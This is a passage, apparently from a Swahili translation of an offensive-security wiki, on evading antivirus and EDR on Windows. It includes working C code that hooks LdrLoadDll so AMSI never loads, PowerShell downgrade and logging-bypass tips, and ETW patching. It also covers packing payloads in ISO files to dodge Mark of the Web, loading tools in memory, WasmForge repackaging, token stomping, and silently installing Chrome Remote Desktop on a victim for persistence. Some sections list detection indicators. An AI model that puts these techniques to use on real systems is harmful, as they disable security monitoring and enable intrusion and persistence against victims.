NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Ioanishe na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu kwenye command line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` kuita `DllRegisterServer`).

Zana **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kufanya bypass ya AMSI.
Zana **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kufanya bypass ya AMSI ambayo huepuka signature kwa kutumia function zilizobainishwa na mtumiaji, variables na character expressions zilizowekwa random, na kubadilisha ukubwa wa herufi za PowerShell keywords bila mpangilio ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyogunduliwa kutoka kwenye memory ya process ya sasa. Zana hii hufanya kazi kwa kuchanganua memory ya process ya sasa ili kutafuta signature ya AMSI, kisha kuifunika kwa maagizo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia Powershell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kuhifadhi kumbukumbu za amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugunduliwa**.

Ili kukwepa PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hiyo unaweza kutekeleza scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia unmanaged PowerShell session**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuzindua `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa controls zinazohusishwa mahususi na mchakato wa `powershell.exe`, lakini yenyewe haizimi AMSI, Script Block Logging, au ulinzi mwingine wote wa PowerShell; kiwango cha ulinzi kinachokwepwa hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na labda tumia usimbaji fiche kwenye sehemu mahususi tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa obfuscation kwenye .NET binaries zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni kawaida kukutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mtiririko wa kazi ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ile ya awali**, ambayo baadaye inaweza ku-decompile-ishwa kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezewa – ConfuserEx husimba kila *method body* na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hurekebisha PE checksum, kwa hiyo marekebisho yoyote yatasababisha binary ku-crash. Tumia **AntiTamperKiller** kutafuta metadata tables zilizosimbwa, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) vinavyoweza kusaidia unapotengeneza unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – peleka faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itaondoa control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za kudumu.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja na wrappers nyepesi (pia hujulikana kama *proxy calls*) ili kufanya decompilation kuwa ngumu zaidi. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary iliyopatikana chini ya dnSpy, tafuta blobs kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload halisi. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Mtiririko huu wa hatua hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sampuli hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumiwa kama IOC kuchuja sampuli kiotomatiki katika uchambuzi wa awali.

#### Amri ya mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya LLVM compilation suite inayoweza kuongeza usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia kuchezea code.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha code iliyofichwa wakati wa compile, bila kutumia zana yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operesheni zilizofichwa, zinazozalishwa na mfumo wa C++ template metaprogramming, ili kumfanya mtu anayetaka crack application awe na kazi ngumu zaidi.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za faili za PE, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation ya kiwango cha chini kwa lugha zinazotumika na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha maagizo ya kawaida kuwa ROP chains, na hivyo kuvuruga mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### Kujificha kwa kujifunika kwa kila function kwa usaidizi wa LLVM compiler

Badala ya kuficha implant nzima inapokuwa imelala tu, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR wakati wowote hazitumiki. PoC ya Function Peekaboo huchagua majina yaliyodemangle ambayo yana `REG_`, huingiza entry/exit stubs zisizotegemea nafasi kuzunguka machine code ya mwisho, na kutoa masking handler moja inayotumika pamoja katika `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki vilevile.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya control flow katika backend

Mabadiliko haya hufanywa baada ya instruction selection na optimization kwa sababu lazima yahusishe **kila return inayotolewa** na yajue mpangilio halisi wa x86. `MachineFunctionPass` inayotekelezwa kabla ya utoaji wa code hupata `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iende moja kwa moja kwenye epilogue iliyoongezwa, na kubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi teardown yoyote ya stack/frame iliyozalishwa na compiler kabla ya kila return; elekeza upya maagizo ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazotumiwa kwa pamoja kati ya hatua za utoaji huruhusu branch ya prologue kuelekezwa kwenye epilogue yake itakayokuja baadaye; kwa `je` ya near inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya baiti nne `target - address_after_je`. Calls na jumps za kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function isiyochaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na uanzishaji kabla ya CRT

PoC huweka XOR key na records za baiti 16 zenye function pointer iliyorekebishwa na loader pamoja na urefu wa runtime katika `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler hufikia QWORD katika offset `+8` ya record, ikitumia urefu na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa baiti nane tu, kwa hiyo utafutaji wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekeleza code, huhifadhi RVA ya entry point ya awali ndani ya stub, na kuelekeza `AddressOfEntryPoint` kwingine; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kutatua `VirtualProtect` ambayo tayari ime-importiwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Uanzishaji huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayoweza kusomeka daima huweka mwanzo wa function katika `gs:[0xF0]`, hugundua sentinel, na kuruka body ambayo bado haijafichwa. Epilogue kisha hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), return address iliyo katika `[rsp+0x68]` ndiyo mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub hufuta sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler yuleyule wa kufungua body. Njia ya mwisho huingia moja kwa moja kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, ili baada ya kuficha tena code, `ret` ya handler itumie return address ya caller wa awali na kuhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive ya masking na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue isiyofichwa yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hufanya XOR ya kila byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo, loop hiyo hiyo hufungua code inapoingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point ndani ya `.stub` inayoweza kutekeleza code, na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import table na section table kabla ya CRT, ukifuatiwa na calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa kwa handler mmoja;
- writes kwa `gs:[0xE8]`, `gs:[0xF0]` na `gs:[0xF8]`, zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR za kila byte ndani ya executable pages zinazoungwa mkono na image.

Hii ni mbinu ya kukwepa memory scanner, si kinga ya cryptographic: faili iliyorekebishwa bado ina body asilia iliyo wazi, na debugger inaweza kuweka breakpoint kwenye `VirtualProtect` au XOR loop na kutoa dump ya function inayotumika. XOR ya byte moja, metadata inayosomeka na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa zinashirikiwa na process nzima. Kwa hiyo, kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha maagizo tena wakati invocation nyingine bado inatekelezwa; exceptions na exits zisizo za kawaida pia zinaweza kuruka hatua ya kuficha tena. Utekelezaji thabiti lazima usawazishe mabadiliko, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa kwa kudumu, ukague njia za `call` na `jmp` ili kuhakikisha stack alignment ya x64, na uite `FlushInstructionCache` baada ya kuandika upya executable bytes. Microsoft inamtaja caller waziwazi kuwa ndiye anayewajibika kwa instruction-cache coherency code inayoweza kutekelezwa inapobadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuzitekeleza.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia hasa mbinu inayotegemea reputation, ikimaanisha kuwa applications ambazo hazipakuliwi mara nyingi zitasababisha SmartScreen kuonyesha tahadhari na kuzuia mtumiaji wa mwisho kutekeleza faili (ingawa faili bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier, ambayo huundwa kiotomatiki wakati faili zinapakuliwa kutoka kwenye intaneti, pamoja na URL ilikotoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS ya faili iliyopakuliwa kutoka kwenye intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizotiwa saini kwa signing certificate **inayoaminika** **hazitasababisha SmartScreen**.

Njia nzuri sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kuwekwa kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads kwenye output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii ni demo ya kubypass SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu madhubuti wa logging katika Windows unaoruhusu programu na vipengele vya mfumo **kuandika matukio kwenye logi**. Hata hivyo, bidhaa za usalama zinaweza pia kuutumia kufuatilia na kutambua shughuli hasidi.

Kama vile AMSI inavyozimwa (kubypassiwa), inawezekana pia kufanya function ya **`EtwEventWrite`** ya process ya user space irudi mara moja bila kuandika tukio lolote kwenye logi. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, hivyo kuzima logging ya ETW kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kupatch AMSI kwa process nzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza assemblies za C# moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha process mpya ya kujitolea**, kuingiza msimbo hasidi wa post-exploitation ndani ya process hiyo mpya, kuutekeleza, kisha kuua process hiyo mpya ukimaliza. Njia hii ina faida na hasara. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje ya** process ya Beacon implant yetu. Hii inamaanisha kwamba jambo likiharibika au kugunduliwa wakati wa hatua zetu za post-exploitation, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kufanya kazi.** Hasara yake ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuichunguza kwa AV, lakini hasara yake ni kwamba jambo likiharibika wakati payload yako inatekelezwa, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu upakiaji wa C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na BOF yao ya InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kufungasha upya zana za .NET kama NativeAOT WebAssembly (WasmForge)

Mbinu za kawaida za `execute-assembly` huhifadhi MSIL inayotambulika na hatimaye kuanzisha CLR. **WasmForge** hubadilisha badala yake msingi wa utekelezaji: huhamisha mradi wa C# hadi kwenye target ya majaribio ya NativeAOT-LLVM WASI, huukompile mapema kuwa WebAssembly, na kupachika module hiyo kwenye PE host ya Windows inayotumia Wazero. Process inayotokana haihitaji CLR, JIT, au host ya `dotnet` ya target, kwa hiyo sheria zinazotegemea tu majina ya managed assembly, upakiaji wa CLR, AMSI, au .NET ETW hupoteza mwonekano wa moja kwa moja. Hii ni mbinu ya evasion/packaging, si kubypass mpaka wa privilege—guest hubaki na ruhusa za zana asili na tabia yake ya OS inayoweza kuonekana.<sup>[[44]](#references)[[45]](#references)</sup>

### Kujenga mradi wa C#

Njia inayopendekezwa ya build ni kutumia mazingira ya Docker ya mradi kwa sababu yana .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker, na dependencies za signing. Faili ya `.csproj` hutambuliwa kiotomatiki; build ya hatua moja hufanya migration, patching ya compatibility, compilation ya WASM, uundaji wa PE, na signing.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Kwa utatuzi wa matatizo au ukaguzi wa code inayozalishwa, gawanya mchakato katika `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, na hatua ya mwisho ya `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Picha ya build pia hutumia wrapper ya `wasm-component-ld` ili kuepuka encoding ya component ya WASI Preview 2 na kutoa module ya kawaida inayotarajiwa na embedded runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunganisha wasm32 C# na x64 Win32

Huu si ujenzi upya unaofanyika bila mabadiliko. NativeAOT-WASI haina au hubadilisha vipengele vya BCL vinavyolenga Windows, na guest ya wasm32 kwa kawaida hutenga nafasi za pointer za baiti nne ilhali API za x64 zinaweza kurudisha pointer za baiti nane. WasmForge hushughulikia matatizo yote mawili kwa tabaka zifuatazo zinazozalishwa:<sup>[[44]](#references)</sup>

1. Source patcher hurekebisha tofauti za kisemantiki mahususi kwa AOT na kuelekeza upya miito ya registry, pipes, WMI, identity, directory-service, file-version, LSA na mingineyo inayotumika kwenye helpers za `Wf*`.
2. P/Invoke scanner hutoa mappings za NativeAOT `DirectPInvoke` ili miito ya `[DllImport]` iunganishwe na alama za C bridge zilizounganishwa badala ya kupakia DLL iliyotajwa kwa nguvu ndani ya guest.
3. Pointer zinazoelekezwa kwa host hutumia `ulong` katika C# na `uint64_t` katika C. Dispatcher ya jumla hupeleka mwito kwa handler ya Win32 ya host; `out8_mask` huashiria nafasi halisi za matokeo za baiti nane ambazo sehemu zake za juu lazima zihifadhiwe. Matokeo yasiyoashiriwa yenye muundo wa wasm32 hutumia ulinzi wa snapshot/restore ili write ya x64 isiharibu baiti nne zilizo jirani.
4. Host bridges maalumu hushughulikia operesheni zisizoweza kutoshea kwenye uelekezaji wa jumla wa syscall, kama vile ufikiaji wa LSA ticket-cache, operesheni za Kerberos/BCrypt zenye matokeo yaliyopangwa, trafiki ya TCP KDC na maswali ya LDAP.

Kwa mfano, wrapper ya `version.dll!VerQueryValueW` hupitisha anwani nne za host na kuweka bits 2 na 3 (`0xC`) kwa sababu pointer ya value na urefu ni nafasi za matokeo za baiti nane. Wrapper yenyewe hubaki ya jumla na kukabidhi jina la DLL, jina la export, arguments na mask kwa `wf_call_v2`; host hutafsiri pointer na kuendesha API asilia.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Vikwazo na viashiria vya kugundua

Msimbo unaotumia sana Reflection, upakiaji wa assembly kwa nguvu, callbacks za native zisizo na vizuizi, na miundo changamano ya x64 inayorejeshwa kwenye kumbukumbu ya WASM bado inaweza kuhitaji marekebisho maalum kwa kila tool au kushindwa kabisa. Sockets za jumla za WASI Preview 2 pia zinaweza kufikia stubs zisizofanya chochote, kwa hivyo tools zinazotumika hutumia host shims maalum kwa kila itifaki. Thibitisha kila command kwa kuilinganisha na build ya native badala ya kudhani vipengele vyote vinafanya kazi sawa.<sup>[[44]](#references)[[45]](#references)</sup>

Mbinu hii huhamisha telemetry badala ya kufanya payload isionekane. Ugunduzi unaweza kulenga PE yenye moduli ya WASM au inayoiunda wakati wa utekelezaji, tabia ya runtime inayofanana na Wazero, ugawaji na unakili wa kumbukumbu usio wa kawaida kati ya host na guest, uelekezaji wa moja kwa moja wa jumla wa Win32, hitilafu katika signing na rasilimali za PE, pamoja na API calls na trafiki ya mtandao inayofuata. Kwa hivyo, kutokuwepo kwa matukio ya CLR-load, AMSI, au .NET ETW hakupaswi kuchukuliwa kuwa ushahidi kwamba process ni salama.<sup>[[44]](#references)</sup>

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji wa **mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Mshambuliaji**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yaliyopo kwenye SMB share, unaweza **kutekeleza msimbo wowote wa lugha hizi ndani ya kumbukumbu** ya mashine iliyoathiriwa.

Repo inaonyesha kuwa: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP na kadhalika, tuna **unyumbufu zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell zilizochaguliwa bila mpangilio na zisizofichwa kwa lugha hizi yamefanikiwa.

## Ku-host tena WebAssembly ili kukwepa uchanganuzi tuli

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kufanya ukaguzi au hatua za kurekebisha zinazohitaji privileges.

Ili kuzuia hili, Windows inaweza **kuzuia processes za nje** kupata handles za tokens za processes za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa kwenye [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha ubofye faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi kimyakimya kwenye mashine ya mwathiriwa (unahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Kisha wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza command iliyotolewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameta ya `--pin` huweka PIN bila kutumia GUI).
 

## Mbinu za Juu za Kukwepa Ugunduzi

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Kukwepa ugunduzi ni mada changamano sana. Wakati mwingine ni lazima uzingatie vyanzo vingi tofauti vya telemetry katika mfumo mmoja tu, kwa hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira unayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana utazame mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuelewa mbinu za juu zaidi za kukwepa ugunduzi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

